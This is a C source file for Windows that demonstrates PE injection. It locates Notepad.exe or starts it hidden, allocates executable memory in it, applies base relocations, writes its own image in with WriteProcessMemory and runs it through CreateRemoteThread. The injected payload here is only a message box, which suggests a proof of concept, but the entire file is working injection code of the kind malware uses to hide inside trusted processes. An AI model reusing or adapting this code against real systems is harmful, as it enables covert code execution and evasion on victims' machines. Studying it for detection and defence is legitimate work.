#include <stdio.h>
#include <Windows.h>
#include <windows.h>
#include <tlhelp32.h>
typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

DWORD InjectionEntryPoint()
{
    CHAR moduleName[128] = "";
    GetModuleFileNameA(NULL, moduleName, sizeof(moduleName));
    MessageBoxA(NULL, moduleName, "Obligatory PE Injection", MB_OK);
    return 0;
}

DWORD get_pid_by_name(const char *proc_name) {
    PROCESSENTRY32 pe32;
    HANDLE hProcessSnap;
    DWORD pid = 0;

    // Take a snapshot of all processes in the system.
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "CreateToolhelp32Snapshot failed, error: %ld\n", GetLastError());
        return 0;
    }

    // Set the size of the structure before using it.
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Retrieve information about the first process,
    // and exit if unsuccessful
    if (!Process32First(hProcessSnap, &pe32)) {
        fprintf(stderr, "Process32First failed, error: %ld\n", GetLastError()); // Show cause of failure
        CloseHandle(hProcessSnap);          // Clean the snapshot object
        return 0;
    }

    // Now walk the snapshot of processes, and display information about each process in turn
    do {
        if (strcmp(pe32.szExeFile, proc_name) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return pid;
}

DWORD LaunchHiddenProcess(const char *processName) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;  // Hide the window

    ZeroMemory(&pi, sizeof(pi));

    // Start the child process
    if (CreateProcess(NULL,       // No module name (use command line)
                      (LPSTR)processName, // Command line
                      NULL,       // Process handle not inheritable
                      NULL,       // Thread handle not inheritable
                      FALSE,      // Set handle inheritance to FALSE
                      0,          // No creation flags
                      NULL,       // Use parent's environment block
                      NULL,       // Use parent's starting directory
                      &si,        // Pointer to STARTUPINFO structure
                      &pi)        // Pointer to PROCESS_INFORMATION structure
    ) {
        // Return the PID of the newly created process
        DWORD pid = pi.dwProcessId;

        // Close handles to avoid resource leaks
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        return pid;
    } else {
        // If process creation failed, return 0 or an appropriate error code
        return 0;
    }
}

int main()
{
    int x;

	PVOID imageBase = GetModuleHandle(NULL);
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);

	PVOID localImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
	memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);


    DWORD pid = get_pid_by_name("Notepad.exe");
    if(pid == 0) {
        pid = LaunchHiddenProcess("Notepad.exe");
    }

    if(pid == 0) {
        printf("Cannot create Notepad process!");
        scanf("%d", &x);
        return 1;
    }

	HANDLE targetProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, pid);
	PVOID targetImage = VirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	DWORD_PTR deltaImageBase = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;

    PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    while (relocationTable->SizeOfBlock > 0)
    {
        DWORD relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
        PBASE_RELOCATION_ENTRY relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);

        for (DWORD i = 0; i < relocationEntriesCount; i++)
        {
            if (relocationRVA[i].Offset)
            {
                PDWORD_PTR patchedAddress = (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);
                *patchedAddress += deltaImageBase;
            }
        }
        relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
    }

	// Write memory into target process
	if (!WriteProcessMemory(targetProcess, targetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL)) {
		VirtualFreeEx(targetProcess, targetImage, 0, MEM_RELEASE);
		CloseHandle(targetProcess);
		VirtualFree(localImage, 0, MEM_RELEASE);
		return 1;
	}
	// Start the injected PE
	DWORD_PTR injectionEntryPointAddress = (DWORD_PTR)InjectionEntryPoint + deltaImageBase;
	HANDLE remoteThread = CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)injectionEntryPointAddress, NULL, 0, NULL);
	if (remoteThread == NULL) {
		VirtualFreeEx(targetProcess, targetImage, 0, MEM_RELEASE);
		CloseHandle(targetProcess);
		VirtualFree(localImage, 0, MEM_RELEASE);
		return 1;
	}

	scanf("%d", &x);
	// Clean up
	CloseHandle(remoteThread);
	VirtualFreeEx(targetProcess, targetImage, 0, MEM_RELEASE);
	CloseHandle(targetProcess);
	VirtualFree(localImage, 0, MEM_RELEASE);

	return 0;
}
